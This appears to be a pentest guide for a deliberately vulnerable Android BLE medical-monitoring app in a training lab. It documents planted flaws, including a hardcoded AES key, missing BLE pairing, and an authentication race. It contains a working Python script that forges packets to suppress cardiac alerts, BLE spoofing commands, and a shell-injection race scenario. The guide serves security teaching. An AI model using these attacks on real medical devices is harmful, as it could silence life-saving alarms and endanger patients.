# CareOtter Mobile App — Pentest Guide

> **Scope**: `vulnzoo_apps/careotter_app` — BLE-only patient monitoring application for Android.
>
> **Target Device**: CareOtter DAI simulator (Raspberry Pi 3B+ with OpenWRT), advertising as `CareOtter_HR` via BLE GATT.

`careotter_app` is intentionally vulnerable by design. It connects exclusively over Bluetooth Low Energy to the CareOtter medical device and displays real-time cardiac telemetry (BPM / SpO₂). The app contains multiple embedded security flaws representative of real-world medical IoT mobile clients.

---

## Communication Stack

```
┌─────────────────────┐              BLE GATT
│  Android Phone      │ ◄──────────────────────► ┌─────────────────────┐
│  careotter_app      │   Heart Rate (0x180D)    │  Raspberry Pi 3B+   │
│                     │   Pulse Ox (0x1822)      │  OpenWRT            │
│  • Scan & connect   │   Alert Threshold        │  ble_server.py      │
│  • Notify subscribe │   (0xFF00)               │  (D-Bus / BlueZ)    │
│  • Plaintext log    │                          │                     │
└─────────────────────┘                          └─────────────────────┘
```

**Key characteristic**: The app has **no HTTP/TCP client**. It does not communicate with the Cloud API (`:5002`) nor with the medical sensor HTTP endpoint (`:8081`). All data flows exclusively through BLE.

---

## Intentional Vulnerabilities

The source code explicitly documents six vulnerabilities. **VULN #6 is intentionally hidden** — it is not visible in the normal UI and must be discovered through pentesting.

| # | Type | Location | Description | OWASP Mobile Top 10 2024 | CWE |
|---|------|----------|-------------|--------------------------|-----|
| 1 | **Missing BLE pairing / bonding** | `BleMonitorClient.startScan()` | Connects to any peripheral advertising the name `CareOtter_HR` without MAC whitelist, pairing, or authentication. | M3: Insecure Authentication/Authorization | CWE-306 |
| 2 | **Unvalidated GATT writes** | `BleMonitorClient.writeThreshold()` | Raw JSON string is written directly to the `ALERT_THRESHOLD` characteristic without schema or length validation. | M4: Insufficient Input/Output Validation | CWE-20 |
| 3 | **Plaintext external storage logging** | `VitalsLogger` | All BPM/SpO₂ readings are appended to `/sdcard/careotter_vitals.log` in cleartext. | M9: Insecure Data Storage | CWE-312 |
| 4 | **Hardcoded thresholds** | `MainActivity.DEFAULT_THRESHOLDS` | Default clinical thresholds (`bpm_min=40`, `bpm_max=120`, `spo2_min=90`) are visible via static analysis / APK decompilation. | M1: Improper Credential Usage | CWE-798 |
| 5 | **Unencrypted BLE channel** | `BleMonitorClient` | No LE Secure Connections, no encryption, no MITM protection. Data travels in plaintext over 2.4 GHz. | M5: Insecure Communication | CWE-319 |
| 6 | **Hidden diagnostic panel** | `MainActivity` (hidden) | A secret threshold write panel is locked behind a gesture. Not visible in normal app use — must be discovered via static analysis or BLE enumeration. | M8: Security Misconfiguration | CWE-912 |

---

## Pentest Test Cases

### 1. BLE Spoofing & Impersonation

| Test                       | Tool / Method                                                                                                    | Expected Result                                                                                                                        |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| **Rogue device spoofing**  | Second Raspberry Pi, ESP32, or Bettercap broadcasting the name `CareOtter_HR` with identical GATT service UUIDs. | The app auto-connects to the attacker-controlled device without requesting pairing or verifying the MAC address. Confirms **VULN #1**. |
| **Passive BLE sniffing**   | Ubertooth One, nRF Sniffer, or rooted Android with `btmon` / HCI snoop.                                          | Captured GATT notifications reveal BPM and SpO₂ values in plaintext. Confirms **VULN #5**.                                             |
| **Characteristic cloning** | The rogue peripheral responds to reads/writes on `ALERT_THRESHOLD` (0xFF01) with attacker-controlled values.     | The app accepts spoofed threshold data as legitimate because there is no signature or authenticity check.                              |

### 2. Medical Data Injection

| Test | Tool / Method | Expected Result |
|------|---------------|-----------------|
| **Vitals falsification** | Rogue device sends HR notifications with BPM = 0, BPM = 250, or SpO₂ = 0. | The app displays critical values and triggers the local alert banner, proving an attacker can inject clinical panic. |
| **Malicious threshold manipulation via hidden panel** | Discover and unlock the diagnostic panel (see §6 below), then edit JSON to `{"bpm_min":0,"bpm_max":300,"spo2_min":0}` and tap *Write Threshold*. | The raw JSON is sent unvalidated to the DAI (**VULN #2**). Life-saving alerts are effectively disabled (*therapeutic suppression*). |
| **Malicious threshold manipulation via BLE** | Use *nRF Connect* or a custom GATT client to write directly to `ALERT_THRESHOLD` (0xFF01) without using the app UI. | The characteristic is writable without pairing. Confirms that the attack surface exists independently of the hidden UI panel. |
| **BLE fuzzing** | Write malformed payloads (e.g., `AAAA`, `<script>`, null bytes, oversized buffers) to `0xFF01`. | Observe whether `ble_server.py` crashes, throws a D-Bus exception, or writes garbage to `/var/log/careotter.thresholds`. |

### 6. Hidden Diagnostic Panel Discovery

The threshold read/write controls are **not visible** in the normal app UI. They are concealed in a hidden panel (`diagnosticPanel`, `android:visibility="gone"`) unlocked by a secret gesture.

**Discovery path A — Static analysis (JADX / apktool)**

1. Decompile the APK: `jadx careotter_app.apk -d output/`
2. In `MainActivity`, search for `diagTapCount` or `DIAG_TAP_TARGET`.
3. The decompiled source reveals a click listener on `tvTitle` that counts taps.
4. 5 rapid taps within 3 seconds on the *CareOtter Monitor* title text → panel appears.

```java
// Decompiled fragment (VULN #6 evidence)
private static final int DIAG_TAP_TARGET = 5;
private static final long DIAG_TAP_WINDOW = 3000;
tvTitle.setOnClickListener(v -> {
    ...
    if (diagTapCount >= DIAG_TAP_TARGET) {
        diagnosticPanel.setVisibility(View.VISIBLE);
    }
});
```

**Discovery path B — BLE characteristic enumeration**

1. Connect *nRF Connect* to the `CareOtter_HR` peripheral.
2. Enumerate services: find `Alert Service` (0xFF00) → `Alert Threshold` (0xFF01).
3. The characteristic has `WRITE` property with no authentication requirement.
4. Write arbitrary JSON directly — app UI is bypassed entirely.

**Expected findings**
- `DEFAULT_THRESHOLDS = {"bpm_min":40,"bpm_max":120,"spo2_min":90}` hardcoded in source (**VULN #4**).
- Written value goes to device unvalidated (**VULN #2**).
- Threshold values affect local alert logic in real-time.

### 3. Data Exfiltration & Privacy

| Test | Tool / Method | Expected Result |
|------|---------------|-----------------|
| **External storage log extraction** | `adb shell cat /sdcard/careotter_vitals.log` | All historical BPM/SpO₂ readings with timestamps are exposed in plaintext. On Android ≤ 10, any app with `READ_EXTERNAL_STORAGE` can access this file (**VULN #3**). |
| **APK static analysis** | Decompile with JADX or apktool. | Hardcoded UUIDs, default thresholds, and the target device name `CareOtter_HR` are trivially recoverable (**VULN #4**). |
| **ADB backup extraction** | `adb backup com.vulnzoo.careotter_app` | Because `android:allowBackup="true"`, app data can be extracted without root, potentially including cached thresholds and logs. |

### 4. Denial of Service (Patient-Side)

| Test | Tool / Method | Expected Result |
|------|---------------|-----------------|
| **Forced disconnection** | 2.4 GHz jamming (Wi-Fi flood on BLE-adjacent channels) or scripted GATT disconnect from the rogue device. | The app shows "Disconnected" and stops receiving vitals. There is **no HTTP fallback**, so monitoring ceases entirely. |
| **Notification flooding** | Rogue device sends 100+ HR notifications per second. | The UI saturates and `VitalsLogger` writes aggressively to disk, potentially exhausting external storage. |

### 5. Permission & Privacy Misconfiguration

| Test | Tool / Method | Expected Result |
|------|---------------|-----------------|
| **Overprivileged permissions** | Inspect `AndroidManifest.xml`. | `WRITE_EXTERNAL_STORAGE` is declared solely to log medical data in plaintext, violating the principle of least privilege. |
| **Screen security bypass** | Attempt screenshots or observe lock-screen notifications while the app is running. | If `FLAG_SECURE` is absent (default), sensitive vitals may leak via screenshots or notifications on a locked device. |

---

## Out-of-Scope for This App

The following attack vectors **do not apply** to `careotter_app` because the corresponding functionality is absent:

| Missing Capability | Why It Is Out-of-Scope |
|--------------------|------------------------|
| **HTTP / TCP client** | The app has no Wi-Fi network attack surface. IGP v4 exploitation (format string, command injection, hardcoded token) must be tested via `careotter_admin` or direct TCP to `:9999`. |
| **Cloud API integration** | No JWT, no REST endpoints, no SSRF, no broken authentication in the patient app. |
| **Encrypted logging** | There is no encryption mechanism to break — the vulnerability is the *absence* of encryption. |

---

## Summary

`careotter_app` is a **valid pentest target** focused on the **BLE perimeter and local data storage**. Its primary attack vectors are:

1. **BLE spoofing** due to missing pairing / MAC whitelisting.
2. **Data injection** through unvalidated GATT characteristic writes.
3. **Data leakage** via plaintext external-storage logging.
4. **Static analysis** exposing hardcoded clinical thresholds and service UUIDs.

To extend testing into the **Wi-Fi / IGP v4** or **Cloud API** attack surfaces, use the **`careotter_admin`** application or attack the **Flask Cloud API** directly.

# Pentest Guide

## M1: Improper Credential Usage — CSCP v1 Hardcoded Key

> **OWASP Mobile Top 10 2024 — M1: Improper Credential Usage**

> **DEFINITION:** 

### Problem Description

The CSCP v1 protocol (CareOtter Secure Config Protocol) uses AES-128-ECB to "protect" clinical threshold writes to `0xFF01`. The master key is embedded in plaintext in two distributed artifacts:

**Device firmware (`ble_server.py`):**
```python
# VULNERABILITY: hardcoded symmetric key — identical across all CareOtter devices
CSCP_KEY   = b"careotter-key-16"   # 16 bytes AES-128
CSCP_MAGIC = 0xCAFE0DDA
```

**Android APK (`CareOtterConfig.java`):**
```java
// VULNERABILITY: hardcoded AES key — identical across all CareOtter devices
private static final byte[] CSCP_KEY = "careotter-key-16".getBytes(StandardCharsets.UTF_8);
```

### Key Extraction

```bash
# From the APK
strings careotter_app.apk | grep -i careotter
# → careotter-key-16

# With jadx (full static analysis)
jadx careotter_app.apk -d output/
grep -r "CSCP_KEY" output/
# → private static final byte[] CSCP_KEY = "careotter-key-16".getBytes(...)

# From the firmware
strings ble_server.py | grep "key-"
# → careotter-key-16
```
### Why It Happens

| Cause                          | Description                                                                                                                                                                                      |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Implementation convenience** | No PKI infrastructure or session management is required. A simple `CSCP_KEY = b"..."` is enough for the protocol to "work."                                                                      |
| **False sense of security**    | "The data is encrypted in transit, therefore it is secure." The mistake is confusing *confidentiality in transit* with *authentication*. If the key is public, encryption only hides the format. |
| **Firmware reuse**             | The same binary is flashed across all devices in the fleet. Compromise of one APK or one device = compromise of the entire hospital fleet.                                                       |

### M1 Attack Chain

```
1. Obtain APK (Play Store / sideload)
         │
         ▼
2. strings careotter_app.apk | grep careotter
   → CSCP_KEY = "careotter-key-16"
         │
         ▼
3. Implement forge_packet(bpm_min=0, bpm_max=255, spo2_min=0)
   [AES-128-ECB + CRC32 + Magic 0xCAFE0DDA]
         │
         ▼
4. BLE scan → find CareOtter_HR (no pairing required)
         │
         ▼
5. write_gatt_char(0xFF01, packet)
         │
         ▼
6. Device updates thresholds → ALL alerts suppressed
   Patient in cardiac arrest (BPM=0) triggers no alert
```

### Root Cause

The universal key `careotter-key-16` is identical across all CareOtter devices. Remediation requires: (1) unique per-device keys generated at manufacturing time in a TPM/secure element, (2) Android Keystore for key handling in the APK, and (3) removing the shared master-key model in favor of BLE LE Secure Connections with per-device certificates.

---

## M3: Overwrite Thresholds — Encryption as False Authentication

> **OWASP Mobile Top 10 2024 — M3: Insecure Authentication/Authorization** (primary)
> **+ M1: Improper Credential Usage** (prerequisite)
> **+ M4: Insufficient Input/Output Validation** (secondary)

### Problem Description

The `ALERT_THRESHOLD` characteristic (UUID `0000ff01-0000-1000-8000-00805f9b34fb`) accepts writes from any BLE client without pairing, without GATT authentication, and without source verification.

The vendor introduced CSCP v1 as a "military-grade security" measure — but the protocol has a fundamental flaw:

> **If the attacker knows the key (hardcoded in firmware and APK), CSCP v1 stops being an authorization barrier and becomes a trivial serialization format.**

The server validates: 24-byte size ✓ · Magic `0xCAFE0DDA` ✓ · CRC32 ✓ · AES decryption ✓

It does not validate: who sent the packet? ✗ · authenticated/paired client? ✗ · clinically plausible values? ✗

**CSCP v1 packet structure (24 bytes, big-endian):**

| Offset | Size | Field   | Description |
|--------|--------|---------|-------------|
| `0x00` | 4      | Magic   | `0xCAFE0DDA` |
| `0x04` | 4      | CRC32   | `crc32(ciphertext)` |
| `0x08` | 16     | Payload | AES-128-ECB(`bpm_min‖bpm_max‖spo2_min‖0x00×13`) |

### Exploitation

The attack runs from Kali Linux using `bleak` and `pycryptodome`, with no physical access and without using the mobile app:

```python
import asyncio, struct, binascii
from bleak import BleakClient, BleakScanner
from Crypto.Cipher import AES

THRESHOLD_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"
CSCP_KEY       = b"careotter-key-16"   # extracted from APK with strings/jadx
CSCP_MAGIC     = 0xCAFE0DDA

def forge_packet(bpm_min, bpm_max, spo2_min):
    pt  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    ct  = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(pt)
    crc = binascii.crc32(ct) & 0xFFFFFFFF
    return struct.pack(">II", CSCP_MAGIC, crc) + ct

async def main():
    device = await BleakScanner.find_device_by_name("CareOtter_HR", timeout=10.0)
    async with BleakClient(device) as c:
        payload = forge_packet(0, 255, 0)   # suppress all clinical alerts
        await c.write_gatt_char(THRESHOLD_UUID, payload)
        print("[+] CSCP v1 lethal thresholds written — alerts suppressed")

asyncio.run(main())
```

The script extracts the key from the APK, forges a valid CSCP v1 packet with lethal thresholds, connects without pairing, and writes it to `0xFF01`. The device accepts it immediately.

By analyzing the GATT attribute, you can identify that it is writable (WRITE property) and that the value handling follows the CSCP v1 format.
![[mobile_initial_thresholds.png|300]]

![[mobile_overwrite_thresholds.png]]

![[mobile_thresholds_changed.png|500]]

### Comparison: Without CSCP v1 vs With CSCP v1

| Aspect | Without CSCP v1 (legacy) | With CSCP v1 (current) |
|---------|----------------------|----------------------|
| Write format | Plain JSON | 24-byte AES-ECB packet |
| Requirement to attack | Know UUID `0xFF01` | Know `CSCP_KEY` (extractable from APK) |
| Session authentication | None | None |
| Range validation | None | None |
| Clinical impact | Identical | Identical |
| Attack difficulty | Trivial | Trivial (once the key is extracted) |

### Clinical and Security Implications

| Impact | Details |
|---------|---------|
| **Alert suppression** | With `bpm_min=0`, `bpm_max=255`, `spo2_min=0`, no reading can trigger an alarm. A patient in cardiac arrest (BPM=0) or severe hypoxia (SpO₂=70%) generates no emergency notification. |
| **Threshold falsification** | The attacker can set impossible thresholds to trigger constant false alarms, causing *alarm fatigue* for medical staff. |
| **Persistence** | The modified thresholds remain active while `ble_server.py` is running. There is no automatic restoration mechanism or write audit log. |
| **No forensic trace** | The BLE write leaves no record on the device. `/var/log/ble_connections.log` only records connections/disconnections, not characteristic writes. |
| **Fleet-wide impact** | The same `CSCP_KEY` is embedded in every CareOtter device. A single APK extraction gives the attacker write access to the entire hospital fleet. |
| **Range of impact** | The attack is possible from approximately 10 meters away without physical access or prior authentication, using standard hardware (a USB BLE adapter on Kali). |

### Server-Side Payload Validation Analysis

`AlertThresholdChrc.WriteValue()` in `ble_server.py` validates packet framing (magic, CRC, size) but applies thresholds without any clinical range check:

```python
@method()
def WriteValue(self, value: "ay", options: "a{sv}"):
    # VULNERABILITY (M3): no session authentication — any paired BLE client writes freely
    # VULNERABILITY (M1): key extracted from firmware/APK breaks "encryption" barrier
    raw = bytes(value)
    thresholds = self._decrypt_and_unpack(raw)
    if thresholds is None:
        print(f"[BLE] CSCP v1 WriteValue: rejected (bad magic/CRC/size) {raw.hex()}")
        return
    # VULNERABILITY: no clinical range validation — bpm_min=0, bpm_max=255, spo2_min=0 accepted
    alert_thresholds["bpm_min"]  = thresholds["bpm_min"]
    alert_thresholds["bpm_max"]  = thresholds["bpm_max"]
    alert_thresholds["spo2_min"] = thresholds["spo2_min"]
```

Server behavior for different payloads:

| Packet sent                                                                 | Magic | CRC | Size     | Result                                     |
| --------------------------------------------------------------------------- | ----- | --- | -------- | ------------------------------------------ |
| Forged CSCP v1 with lethal values (`0, 255, 0`)                             | ✓     | ✓   | 24       | **Thresholds updated — alerts suppressed** |
| CSCP v1 with partial values (`bpm_min=50` only possible via direct forging) | ✓     | ✓   | 24       | **All fields updated** (3 plaintext bytes) |
| Incorrect magic                                                             | ✗     | —   | 24       | Silently rejected                          |
| Incorrect CRC                                                               | ✓     | ✗   | 24       | Silently rejected                          |
| Incorrect size (≠24)                                                        | —     | —   | —        | Silently rejected                          |
| Plain JSON (`{"bpm_min":0,...}`)                                            | ✗     | —   | variable | Rejected (magic mismatch)                  |

**Key finding**: CSCP v1 provides packet integrity validation (magic + CRC) but zero session authentication and zero medical range validation. The hardcoded key turns "encryption" into a format filter, not a security barrier.

### Root Cause

Remediation requires: (1) BLE LE Secure Connections with authenticated pairing before allowing writes to `0xFF01`, (2) clinical range validation (`0 < bpm_min < bpm_max < 250`, `50 < spo2_min < 100`), (3) per-device keys instead of a universal master key, and (4) logging every write with client MAC address in `/var/log/ble_connections.log`.

## M4: Insufficient Input/Output Validation

> **OWASP Mobile Top 10 2024 — M4: Insufficient Input/Output Validation**

### Description
The mobile app does not allow manual selection of the target device. It implements a *“Scan and Connect”* button that automatically selects the first BLE peripheral whose advertising name matches `CareOtter_HR`. 

The BLE device name is **untrusted input** that comes from the environment (advertising packets broadcast by any transmitter in the air). The app treats it as a legitimate identifier without validation:

- **Does not verify service UUIDs:** Any device can advertise the name `CareOtter_HR` without implementing the `0x180D` (Heart Rate) or `0x1822` (SpO2) services.
- **Does not verify the MAC address:** Connects to the first device that appears, without a prior bonding whitelist or comparison with historically paired devices.
- **Does not validate manufacturer data:** The advertising packet contains fields for manufacturer data (Company ID) that are also not checked.

### Impact
An attacker can deploy a **rogue BLE device** (USB dongle, Raspberry Pi, or even a smartphone running nRF Connect in *Advertiser* mode) that impersonates the legitimate medical monitor. 

Once the biomedical technician’s app connects to the rogue device:
1. The attacker receives the hardcoded administrative credentials (`OtterMobile2026` via IGP, or the CSCP v1 key `careotter-key-16`).
2. The attacker can log the patient’s vital signs in real time (HIPAA/GDPR privacy violation).
3. The attacker can subsequently re-inject malicious thresholds into the real device (if they have the M1 credentials).
4. In an advanced scenario, the rogue device can act as a **BLE-IP proxy** to pivot into the hospital network.

### Attack Vector: BLE Spoofing + Man-in-the-Middle

#### Step 1: Environment Reconnaissance
Use `hcitool` or `bettercap` from Kali to identify the CareOtter’s legitimate MAC address and copy its advertising parameters:

```bash
# Passive scan to view the device's MAC address
sudo hcitool lescan --duplicates
# Sample output: 43:45:C0:00:1F:AC  CareOtter_HR
```

#### Step 2: Cloning the advertising
Using any BLE interface (CSR 4.0 dongle, Raspberry Pi, nRF52840):
```bash
# Configure the attacker adapter with the same name and medical device class
sudo hciconfig hci0 name "CareOtter_HR"
sudo hciconfig hci0 class 0x7A0440  # Medical/Pulse Oximeter/Heart Rate Monitor
sudo hciconfig hci0 leadv 0          # Start advertising
```

Or with Bettercap (which allows for complete cloning of advertising data):
```bash
sudo bettercap -eval "
  set ble.device CareOtter_HR
  ble.recon on
  # Wait for the technician's app to connect to the rogue device
"
```
#### Step 3: GATT Service Impersonation (Optional - Rogue Server)
If the attacker wants to maintain the connection without raising suspicion, they can set up a minimal GATT server with the same UUIDs (0x180D, 0x1822, 0xFF00) that return simulated vital data. This keeps the app “running” while the admin credentials are intercepted.

#### Step 4: Credential Interception
When the app attempts to authenticate against the rogue device (for example, by sending the OtterMobile2026 token via the IGP protocol encapsulated in BLE, or the CSCP v1 key to modify thresholds), the attacker captures:

- The AES key `careotter-key-16` (if the app sends it in a handshake).
- The CSCP v1 packets that the app constructs (reversible with the hardcoded key extracted from the APK).
- The maintenance credentials `careotter` / `svc_maint_2024!` if the app opens an administration channel.

### Evidence in nRF Connect
From the attacker's perspective, evidence of spoofing is visible in the Advertiser tab of nRF Connect:

| Campo Advertising       | Legitimate Value                  | Rogue Value (Attacker)       |
| ----------------------- | --------------------------------- | ---------------------------- |
| **Complete Local Name** | `CareOtter_HR`                    | `CareOtter_HR` (cloned)      |
| **MAC Address**         | `43:45:C0:00:1F:AC`               | `AA:BB:CC:11:22:33` (random) |
| **Appearance**          | `0x0341` (Generic Pulse Oximeter) | `0x0341` (copied)            |
| **Service UUIDs**       | `0x180D`, `0x1822`                | Empty or copied              |

**Critical Note:** The CareOtter app does not inspect the table above. It only reads the Complete Local Name field.
Relationship to Other Vulnerabilities (Kill Chain)
This M4 vulnerability acts as an entry point that enables the rest of the attack:

1. **M4 (Input Validation)** → The app connects to the rogue device using a spoofed name.
2. **M1 (Improper Credentials)** → The app leaks the CSCP v1 key (careotter-key-16) or the IGP token (OtterMobile2026) to the attacker.
3. **M3 (Insecure Auth/AuthZ)** → The attacker uses these stolen credentials to connect to the REAL medical device and modify lethal thresholds via 0xFF01.

Without the M4 flaw, the attacker would need physical compromise of the device or prior reverse engineering of the APK. M4 enables a remote and passive attack (requiring only a BLE dongle in the same room).
### Escalation Variants
#### A. Denial of Service (Medical DoS)
The attacker does not need to set up a full rogue server. They simply broadcast CareOtter_HR with a stronger signal than the legitimate Raspberry Pi. The technician’s app will connect to the attacker rather than the actual device. If the attacker does not respond, the app freezes and the patient monitor fails to report vital signs.
#### B. Downgrade Attack
The rogue device broadcasts CareOtter_HR but with an older firmware version in the Manufacturer Specific Data. If the app has downgrade logic (CareOtter does not, but this is a common pattern in IoMT), it could force the installation of vulnerable firmware.

---

## Authentication State Race Condition — IGP Admin Panel

> **Primary entry:** `docs/CareOtter/IoT/CareOtter_IoT.md` — IoT:I7.2 (CWE-362)  
> **Scope:** `AdminActivity.java` — `execProtected()` method

### Description

`AdminActivity` implements the **auth → cmd → deauth** mitigation cycle via `execProtected()`. Each call to this method generates three independent TCP connections to careservice at `:9999`. Between connection 1 (auth) and connection 3 (deauth), the device's global `authenticated` flag is `1` and any host on `192.168.2.0/24` can execute privileged IGP commands without credentials.

This vulnerability is a consequence of the device design (CWE-362 + CWE-613 in `careservice.c`), but `AdminActivity.java` is the component that **opens the window** on every protected admin action.

### Problematic Code — `AdminActivity.java`

```java
// AdminActivity.java — execProtected()
private String execProtected(NetworkTask protectedCmd) throws Exception {
    IgpClient client = igp();
    String authResp = client.authenticate();   // TCP conn 1 → authenticated=1
    //                                           ↑ WINDOW OPENS — any TCP client can now
    //                                             execute privileged IGP commands
    if (!authResp.contains("AUTH_SUCCESS")) {
        throw new Exception("IGP auth failed: " + authResp);
    }
    try {
        String result = protectedCmd.run();    // TCP conn 2 → selected command
        //                                       ↑ WINDOW STILL OPEN
        return result;
    } finally {
        try {
            igp().deauthenticate();            // TCP conn 3 → authenticated=0
            //                                   ↑ WINDOW CLOSES
        } catch (Exception ignored) { }
    }
}
```

Each `igp()` call instantiates a new `IgpClient` that opens and closes a TCP socket.
The three sockets are **sequential but independent** — there is no mechanism that
prevents an external TCP client from inserting between them.

### Trigger Events

Every tap on a protected button in `AdminActivity` opens the window:

| Button              | IGP command triggered                    | Window duration |
| ------------------- | ---------------------------------------- | --------------- |
| `btnWifiConfig`     | `0x02 → 0x03 GET_NETWORK → 0x0D`         | ~2–50 ms        |
| `btnDefibrillate`   | `0x02 → 0x0B DEFIBRILLATE → 0x0D`        | ~2–50 ms        |
| `btnEmergencyAlert` | `0x02 → 0x0C EMERGENCY_ALERT → 0x0D`     | ~2–50 ms        |
| `btnCmdInjection`   | `0x02 → 0x0C (injection payload) → 0x0D` | ~2–50 ms        |
| `btnCheckStatus`    | `0x02 → 0x03 GET_NETWORK → 0x0D`         | ~2–50 ms        |

### Attack Scenario

1. Attacker is on the same `192.168.2.0/24` network as the Raspberry Pi.
2. Attacker polls `:9999` continuously sending `IGP 0x06 SET_WIFI` with a shell injection payload.
3. Admin opens `AdminActivity` and taps any protected button.
4. `execProtected()` fires: conn 1 sets `authenticated=1`.
5. Attacker's polling connection arrives during the window — careservice executes the privileged command.
6. Conn 3 fires: `authenticated=0` — window closed, but RCE already executed.

### Difference from Needing the Token

An attacker exploiting this race condition does **not need** the IGP token
(`OtterMobile2026`). They need only:
- Network access to `:9999`
- Awareness that the admin is using the app (observable via BLE advertising or network traffic)
- The IGP packet format (documented in source; trivially extracted from the APK with `jadx`)

### No Mitigation Available at App Level

Moving `execProtected()` to use a single TCP connection with multiple IGP frames
would require careservice to accept multiple commands per connection — a
server-side architectural change. The app-side lock pattern cannot close this
race window because the vulnerability is in the **careservice process design**,
not in the client sequencing.

The correct fix is in `careservice.c`: scoping `authenticated` to the connection
descriptor (local variable in `handle_request()`) rather than the process.

**References:** CWE-362 · CWE-613 · OWASP IoT Top 10 — I7 · `docs/CareOtter/IoT/CareOtter_IoT.md` §IoT:I7.2

---

## Operator UX & Diagnostic Hardening

> **Changed:** 2026-05-20. These are not vulnerability fixes — they're UX
> improvements that turned a class of "doesn't work and I can't tell why"
> into observable, recoverable flows. Documented here so operators reproducing
> the lab know what to expect.

### LoginActivity — Password Visibility Toggle

The patient/admin login (`LoginActivity.java` + `activity_login.xml`) now
has an eye-icon toggle next to the password field. Default state is hidden
(`inputType=textPassword`); tap to reveal, tap again to hide.

| Element | Resource | Notes |
|---|---|---|
| Show drawable | `res/drawable/ic_password_show.png` | Open eye, shown when password is visible |
| Hide drawable | `res/drawable/ic_password_hide.png` | Closed eye (lashes), default state |
| Container | `LinearLayout` wrapping `etPassword` + `ImageView` | Same `@drawable/input_background` as the rest of the form so the toggle sits *inside* the field |
| Logic | `LoginActivity.btnTogglePassword.setOnClickListener` | Swaps `TransformationMethod` + `setImageResource` + `contentDescription` |

Cursor position is preserved across the toggle (`setSelection(sel)` after
the transformation method changes) so users don't lose their place. The
`ImageView` is fixed at 44dp × 48dp; the visual size of the icon never
changes between states — only the drawable swaps.

### AdminActivity — BLE Wi-Fi Provisioning Scan UI

The "Set WiFi via BLE" feature in the admin panel previously auto-scanned
and auto-connected to the first device named `CareOtter_HR`. When the scan
failed on this hardware (Redmi/MIUI), the UI stuck on "Scanning for
CareOtter_HR…" with no recourse. Refactored into a two-phase, observable
flow.

#### Two-Phase API

`BleWifiProvisioner.java` exposes:

```java
public void startScan(Callback cb)                      // phase 1: discovery
public void stopScan()                                  // manual abort
public void provision(String mac, String ssid,
                      String psk, Callback cb)          // phase 2: connect+PIN+write
```

The `Callback` interface emits five distinct events:

| Method | When |
|---|---|
| `onLog(msg)` | Every observable step (scan start, each device found, PIN write enqueued, etc.) — mirrored to the IGP output console in `tvAdminOutput` |
| `onDeviceFound(name, addr, rssi)` | One row per distinct MAC matching the `CareOtter_HR` name filter |
| `onScanStopped(reason)` | Timeout (20s) / manual / scan-error — UI re-enables the Scan button |
| `onStatus(msg)` | Short status for the small label `tvBleWifiStatus` |
| `onComplete(success, msg)` | Terminal — provisioning attempt finished |

#### UI Layout (`activity_admin.xml` BLE WiFi card)

```
┌─────────────────────────────────────────────┐
│ BLE Wi-Fi Provisioning              [BLE]   │
│ Hidden GATT service — factory installer     │
│                                             │
│ [ Scan BLE ]            [ Stop ]            │  ← btnBleScan / btnBleStopScan
│                                             │
│ Selected: CareOtter_HR  B8:27:EB:79:53:C3   │  ← tvBleSelected
│                         -45dBm              │
│                                             │
│ ┌─────────────────────────────────────────┐ │
│ │ CareOtter_HR  B8:27:EB:79:53:C3  -45dBm │ │  ← llBleDevices (populated
│ └─────────────────────────────────────────┘ │     dynamically; tap to pick)
│                                             │
│ [SSID            ] [Password           ]    │
│ [        Set WiFi via BLE         ]         │  ← disabled until a device picked
│ Scanning… tap a device to pick it           │  ← tvBleWifiStatus
└─────────────────────────────────────────────┘
```

#### Hardening Applied to the BLE State Machine

Empirically, the admin scan failed cold (only worked after the patient app
had performed a connect+disconnect cycle on the same phone). Root-caused as
three issues:

1. **`state != IDLE` rejected new scans** — if a previous `connectGatt`
   never delivered `STATE_DISCONNECTED`, state was stuck at `CONNECTING`
   and every subsequent tap returned "Busy" without even calling
   `BluetoothLeScanner.startScan`. Fixed by forcing
   `gatt.close()` + `state = IDLE` at the top of `startScan` and
   `provision` instead of refusing.
2. **15s connect timeout closed the GATT** while the Cypress BCM43430 was
   still establishing — the patient client has no such timeout and works.
   Removed.
3. **`callback = null` in `reportComplete` raced with `onScanStopped`** —
   the UI button never flipped back to "Scan". Fixed by snapshotting
   `callback` into a local before `post()`.
4. **`state` written from 3 threads** (UI / binder / Handler) without
   `volatile` — made the read in the IDLE check observe stale values.
   Marked `volatile`.

`AdminActivity` also now requests `BLUETOOTH_SCAN` / `BLUETOOTH_CONNECT` in
`onCreate` (same pattern as `MainActivity`), not lazily on first tap.
Empirically the first scan after the permission dialog races the OS
permission grant on Android 12+ and delivers zero `onScanResult` callbacks.

#### Filtering

`onScanResult` only emits the row if the advertised name equals exactly
`CareOtter_HR` (read first from `device.getName()`, fallback to
`ScanRecord.getDeviceName()`). The list shows nothing if no Pi is in
range — by design — and the 20s scan timeout reports
`"Scan finished (timeout)"` so the operator doesn't sit forever.

#### Verification

```sh
# Watch every BLE step live (filter to the app + crash class)
adb logcat -v time BleWifiProvisioner:V AdminActivity:V AndroidRuntime:E "*:S"
```

Expected sequence on a successful provisioning:

```
[BLE] Starting BLE scan — emitting every device for 20s
[BLE] Device found: CareOtter_HR  B8:27:EB:79:53:C3  rssi=-45dBm
[BLE] Selected B8:27:EB:79:53:C3
[BLE] === Provisioning B8:27:EB:79:53:C3 ===
[BLE] connectGatt() issued
[BLE] GATT state status=0 newState=2
[BLE] Services discovered status=0
[BLE] PIN write enqueued=true
[BLE] onCharacteristicWrite 0000ff12-… status=0
[BLE] Writing WiFi config: {"cmd":"wifi_set","ssid":"…","psk":"***"}
[BLE] WiFi write enqueued=true
[BLE] onCharacteristicWrite 0000ff11-… status=0
[BLE-WiFi] OK — WiFi configured: SSID=…
```

The PSK is masked as `***` in the log line; the actual write to GATT
0xFF11 still carries the plaintext PSK (P5 — see `IoT:I7`).